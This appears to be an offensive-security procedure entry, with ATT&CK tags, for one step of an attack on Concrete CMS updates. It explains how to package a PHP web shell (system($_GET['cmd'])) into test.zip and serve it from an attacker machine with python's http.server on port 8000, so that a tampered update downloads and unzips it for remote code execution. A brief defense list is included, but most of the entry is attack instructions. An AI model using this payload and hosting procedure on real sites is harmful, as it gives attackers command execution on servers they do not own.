---
id: proc-concrete-zip-host-001
tags:
  - malicious-zip
  - payload-hosting
  - rce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:24.107Z'
skill_level: low
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Host-Malicious-ZIP-File-on-Attacker-Server

## Summary

This procedure involves creating and hosting a ZIP file containing a malicious PHP payload on an attacker-controlled server, which will be downloaded and unzipped by the tampered Concrete CMS update process.

## Description

The ZIP file (test.zip) includes a PHP file (poc.php) with RCE payload, such as <?php system($_GET['cmd']); ?>. Hosted via a simple HTTP server on port 8000, it targets the redirected download from the JSON tamper. Prerequisites: PHP knowledge for payload; expected outcome: ZIP served over HTTP for CMS consumption, leading to unzip in writable updates directory.

## Requirements

1. Attacker machine with Python or similar for HTTP server
2. Malicious PHP payload file (poc.php)
3. ZIP tool to package poc.php into test.zip

## Defense

Defensive measures and detection strategies:

- Scan downloaded ZIPs for malware before unzip
- Restrict writable directories and monitor file creations
- Block unexpected external downloads in CMS

## Objectives

1. Serve ZIP for download via tampered URL
2. Ensure payload executes post-unzip
3. Facilitate RCE in the attack chain

## Instructions

### Step 1: Create Payload and ZIP

**Context**: Prepare the malicious content.

Create poc.php with RCE code, then zip it: zip test.zip poc.php.

> Expected output: test.zip file ready.

### Step 2: Start HTTP Server

**Context**: Host the ZIP for access.

Run python -m http.server 8000 in the directory containing test.zip.

> Expected output: Server listening; access http://192.168.1.170:8000/test.zip to verify download.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- malicious-zip
- payload-hosting
- rce
